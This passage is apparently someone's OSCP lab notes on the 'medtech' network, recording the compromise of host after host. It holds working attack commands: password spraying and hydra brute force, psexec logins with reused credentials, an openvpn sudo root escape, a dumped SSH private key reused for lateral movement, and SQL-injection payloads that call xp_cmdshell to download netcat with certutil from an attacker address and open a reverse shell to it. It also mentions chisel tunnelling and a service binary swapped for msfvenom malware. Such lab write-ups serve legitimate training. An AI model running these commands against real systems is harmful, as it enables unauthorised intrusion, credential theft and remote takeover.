995/tcp  closed pop3s
1723/tcp closed pptp
3306/tcp closed mysql
3389/tcp closed ms-wbt-server
5900/tcp closed vnc
8080/tcp closed http-proxy
```

2. Use credentials of leon after making slight changes on password to login 
```
┌──(kali㉿kali)-[~/OSCP/labs/medtech]
└─$ proxychains impacket-psexec medtech/leon:'rabbit:)'@172.16.208.10

```

3. Found proof.txt
```
C:\Users\Administrator\Desktop> type proof.txt
930b8c60b91a0c582ecfb32429cfb5ca
```

4. Obtained another credentials 
```
C:\Users\Administrator\Desktop> type credentials.txt
web01: offsec/century62hisan51
C:\Users\Administrator\Desktop> 
```

## 172.16.213.82
1. Start spraying already available username and password. 
```
┌──(kali㉿kali)-[~/OSCP/labs/medtech]
└─$ proxychains crackmapexec smb 172.16.213.82 -u user.txt -p 'Mushroom!' -d medtech.com --continue-on-success

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.213.82:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.213.82:445  ...  OK
SMB         172.16.213.82   445    CLIENT01         [+] medtech.com\yoshi:Mushroom! (Pwn3d!)

```
2. Obtained creds - yoshi:Mushroom!. Rdp connection and obtained flag. 
```
1. proxychains xfreerdp /cert-ignore /u:yoshi /d:medtech.com /p:Mushroom! /v:172.16.213.82

2. C:\Users\Administrator\Desktop> e09e14624ae084ff1d5fd463578358cc
```


## 192.168.226.122
1. Rustscan
```
┌──(kali㉿kali)-[~/OSCP/labs/medtech]
└─$ rustscan 192.168.226.122
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.226.122:22
Open 192.168.226.122:1194
```

2. Nmap
```
──(kali㉿kali)-[~/OSCP/labs/medtech]
└─$ nmap -p$(cat 122-open-ports.txt | cut -f1 -d '/' | tr '\n' ',') -T4 -A 192.168.226.122
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-12 06:48 EST
Nmap scan report for 192.168.226.122
Host is up (0.38s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 60:f9:e1:44:6a:40:bc:90:e0:3f:1d:d8:86:bc:a9:3d (ECDSA)
|_  256 24:97:84:f2:58:53:7b:a3:f7:40:e9:ad:3d:12:1e:c7 (ED25519)
1194/tcp open  tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.15 seconds

```

3. No attack surface figured out. 

4. Try ssh brute force with user offsec and rockyou.txt
```
┌──(kali㉿kali)-[~/OSCP/labs/medtech]
└─$ hydra -l offsec -P /usr/share/wordlists/rockyou.txt -s 22 ssh://192.168.208.122 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-13 22:20:23
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.208.122:22/
[22][ssh] host: 192.168.208.122   login: offsec   password: password
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-02-13 22:20:34
```

5. Ssh login using obtained credentails
```
┌──(kali㉿kali)-[~/OSCP/labs/medtech]
└─$ ssh offsec@192.168.208.122   
The authenticity of host '192.168.208.122 (192.168.208.122)' can't be established.
ED25519 key fingerprint is SHA256:udGiqS5CWuVlHprkRFQ8yQLekVjoJKlrAiv3UTP6POo.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:32: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.208.122' (ED25519) to the list of known hosts.
offsec@192.168.208.122's password: 
Last login: Wed Mar  8 07:42:02 2023
(lshell) - You are in a limited shell.
Type '?' or 'help' to get the list of allowed commands
offsec:~$ 
```

6. Obtained local.txt
```
offsec:~$ cat local.txt
eb72a20e7dff1bcd9240f32172c2ae76
```

7. Privilege escalation using sudo
```
offsec:~$ sudo -l
[sudo] password for offsec: 
Matching Defaults entries for offsec on vpn:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User offsec may run the following commands on vpn:
    (ALL : ALL) /usr/sbin/openvpn



offsec:~$ sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
2024-02-14 03:22:25 Cipher negotiation is disabled since neither P2MP client nor server mode is enabled
2024-02-14 03:22:25 OpenVPN 2.5.5 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on Mar 22 2022
2024-02-14 03:22:25 library versions: OpenSSL 3.0.2 15 Mar 2022, LZO 2.10
2024-02-14 03:22:25 NOTE: the current --script-security setting may allow this configuration to call user-defined scripts
2024-02-14 03:22:25 ******* WARNING *******: All encryption and authentication features disabled -- All data will be tunnelled as clear text and will not be protected against man-in-the-middle changes. PLEASE DO RECONSIDER THIS CONFIGURATION!
2024-02-14 03:22:25 /bin/sh -c sh null 1500 1500   init
# id
uid=0(root) gid=0(root) groups=0(root)
```

8. Obtained proof
```
# cat proof.txt 
0062ac8b522921a79d123d6f76aa4a03
```

9. Obtained id_rsa for user mario who can be user at 14
```
# pwd
/home/mario/.ssh
# cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
pI77A9Emp3E9cAAAAJbWFyaW9AdnBuAQI=
-----END OPENSSH PRIVATE KEY-----
```

## 172.16.208.12 
1. Nmap scans
```
Nmap scan report for 172.16.208.12
Host is up (2.9s latency).

PORT     STATE  SERVICE
21/tcp   closed ftp
22/tcp   closed ssh
23/tcp   closed telnet
25/tcp   closed smtp
53/tcp   closed domain
80/tcp   closed http
110/tcp  closed pop3
111/tcp  closed rpcbind
135/tcp  open   msrpc
139/tcp  open   netbios-ssn
143/tcp  closed imap
443/tcp  closed https
445/tcp  open   microsoft-ds
993/tcp  closed imaps
995/tcp  closed pop3s
1723/tcp closed pptp
3306/tcp closed mysql
3389/tcp open   ms-wbt-server
5900/tcp closed vnc
8080/tcp closed http-proxy
```

2. Credentials stuffing:
```
┌──(kali㉿kali)-[~/OSCP/labs/medtech]
└─$ proxychains crackmapexec smb 172.16.208.12 -u user.txt -p pass.txt -d medtech.com --continue-on-success

SMB         172.16.208.12   445    DEV04            [-] medtech.com\leon:Mushroom! STATUS_LOGON_FAILURE 
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.208.12:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.208.12:445  ...  OK
SMB         172.16.208.12   445    DEV04            [+] medtech.com\leon:rabbit:) (Pwn3d!)
```

3. Rdp login
```
┌──(kali㉿kali)-[~/OSCP/labs/medtech]
└─$ proxychains xfreerdp /cert-ignore /u:leon /d:medtech.com /p:'rabbit:)' /v:172.16.208.12
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
```

4. Local.txt - C:\Users\yoshi\Desktop
5. Proof.txt - C:\Users\Administrator\Desktop 

## 172.16.208.13
1. Nmap scan
```
Nmap scan report for 172.16.208.13
Host is up (3.1s latency).

PORT     STATE  SERVICE
21/tcp   closed ftp
22/tcp   closed ssh
23/tcp   closed telnet
25/tcp   closed smtp
53/tcp   closed domain
80/tcp   closed http
110/tcp  closed pop3
111/tcp  closed rpcbind
135/tcp  open   msrpc
139/tcp  open   netbios-ssn
143/tcp  closed imap
443/tcp  closed https
445/tcp  open   microsoft-ds
993/tcp  closed imaps
995/tcp  closed pop3s
1723/tcp closed pptp
3306/tcp closed mysql
3389/tcp closed ms-wbt-server
5900/tcp closed vnc
8080/tcp closed http-proxy
```

2. Credential spraying and confirm
```
┌──(kali㉿kali)-[~/OSCP/labs/medtech]
└─$ proxychains crackmapexec smb 172.16.208.13 -u leon -p 'rabbit:)' -d medtech.com --continue-on-success
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.208.13:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.208.13:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.208.13:135  ...  OK
SMB         172.16.208.13   445    PROD01           [*] Windows 10.0 Build 20348 x64 (name:PROD01) (domain:medtech.com) (signing:False) (SMBv1:False)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.208.13:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.208.13:445  ...  OK
SMB         172.16.208.13   445    PROD01           [+] medtech.com\leon:rabbit:) (Pwn3d!)
```

3. Impacket-Psexec smb login
```
──(kali㉿kali)-[~/OSCP/labs/medtech]
└─$ proxychains impacket-psexec medtech/leon:'rabbit:)'@172.16.208.13
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.11.0 - Copyright 2023 Fortra

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.208.13:445  ...  OK
[*] Requesting shares on 172.16.208.13.....
```

4. Find out proof.txt
```
C:\Users\Administrator\Desktop> type proof.txt
715c01b66852859ba20e7b6c0b34b939
```

## 172.16.208.14
1. Nmap scan
```

PORT     STATE  SERVICE
21/tcp   closed ftp
22/tcp   open   ssh
23/tcp   closed telnet
25/tcp   closed smtp
53/tcp   closed domain
80/tcp   closed http
110/tcp  closed pop3
111/tcp  closed rpcbind
135/tcp  closed msrpc
139/tcp  closed netbios-ssn
143/tcp  closed imap
443/tcp  closed https
445/tcp  closed microsoft-ds
993/tcp  closed imaps
995/tcp  closed pop3s
1723/tcp closed pptp
3306/tcp closed mysql
3389/tcp closed ms-wbt-server
5900/tcp closed vnc
8080/tcp closed http-proxy
```

2. Tried with mario user id_rsa connection
```
┌──(kali㉿kali)-[~/OSCP/labs/medtech]
└─$ chmod 600 mario_id_rsa 
                                                                              
┌──(kali㉿kali)-[~/OSCP/labs/medtech]
└─$ proxychains ssh -i mario_id_rsa mario@172.16.208.14
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.208.14:22  ...  OK
Linux NTP 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Oct  6 11:35:48 2022 from 192.168.118.2
$ id
uid=1001(mario) gid=1001(mario) groups=1001(mario)
$ whoami
mario
```

3. Obtained local.txt
```
$ cat local.txt
a2a20c2d55ef5721bd0c2377d12f483e
```

4. No proof.txt on this machine





## Revision 
121 > 11 > 83 > 82 >10 > 120 > 122 > 14 > 12 > 13
### Credentials 

#### User 
```
Administrator 
Guest
joe
krbtgt
leon
mario
offsec
peach
wario
yoshi
```
#### Pass
```
Flowers1
Mushroom!
rabbit:)
```
### 10
```
proxychains impacket-psexec MEDTECH.COM/leon:'rabbit:)'@172.16.192.10 
C:\Users\Administrator\Desktop> type proof.txt
13d7dccd676d263e41ce698ee9c62f11

C:\Users\Administrator\Desktop> type credentials.txt
web01: offsec/century62hisan51

all done
```
### 11
```
from 121
local and proof both 
mimikatz = joe:08d7a47a6f9f66b97b1bae4178747494:Flowers1
found wario user creds 
wairo: fdf36048c1cf88f5630381c5e38feb8e: Mushroom!
```
### 12
```
proxychains impacket-psexec MEDTECH.COM/leon:'rabbit:)'@172.16.192.12
both local and proof
```
### 13
```
proxychains impacket-psexec MEDTECH.COM/leon:'rabbit:)'@172.16.192.13
proof 
```
### 14
```
22/tcp   open   ssh

```
### 82
```
proxychains crackmapexec smb 172.16.192.82 -u user.txt -p 'Mushroom!' -d medtech.com --continue-on-success
yoshi mushroom!
proxychains xfreerdp /u:yoshi /p:Mushroom! /d:medtech.com /v:172.16.192.82
proot.txt
hole file in administrator.medtech = leon:rabbit!:)
ALL done 
```
### 83
```
from 11 
winrs -r:CLIENT02 -u:wario -p:Mushroom! "powershell -nop -w hidden -e"

local.txt 

service audittracker.exe replace by msfvenom malicous file 

proof.txt. 

```
### 120
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 84:72:7e:4c:bb:ff:86:ae:b0:03:00:79:a1:c5:af:34 (RSA)
|   256 f1:31:e5:75:31:36:a2:59:f3:12:1b:58:b4:bb:dc:0f (ECDSA)
|_  256 5a:05:9c:fc:2f:7b:7e:0b:81:a6:20:48:5a:1d:82:7e (ED25519)
80/tcp open  http    WEBrick httpd 1.6.1 (Ruby 2.7.4 (2021-07-07))
|_http-title: PAW! (PWK Awesome Website)
|_http-server-header: WEBrick/1.6.1 (Ruby/2.7.4/2021-07-07)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

ssh offsec@192.168.192.120

sudo su
proof
all done 
```
### 121
```
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: MedTech
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-04-05T11:04:49
|_  start_date: N/A

';RECONFIGURE;--
';EXECUTE xp_cmdshell 'whoami';--

';EXEC xp_cmdshell "certutil -urlcache -f http://192.168.45.194/nc64.exe c:/windows/temp/nc64.exe";--
';EXEC xp_cmdshell "c:\windows\temp\nc64.exe 192.168.45.194 4444 -e cmd.exe";--

.\PrintSpoofer64.exe -i -c powershell.exe

certutil -urlcache -f http://192.168.45.194:800/chisel-w chisel.exe

.\chisel.exe client 192.168.45.194:8081 R:1080:socks 


Done all 
```
### 122
```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 60:f9:e1:44:6a:40:bc:90:e0:3f:1d:d8:86:bc:a9:3d (ECDSA)
|_  256 24:97:84:f2:58:53:7b:a3:f7:40:e9:ad:3d:12:1e:c7 (ED25519)
1194/tcp open  tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

hydra -l offsec -P /usr/share/wordlists/rockyou.txt ssh://192.168.192.122

ssh offsec@192.168.192.122  

local.txt
sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
proof.txt


```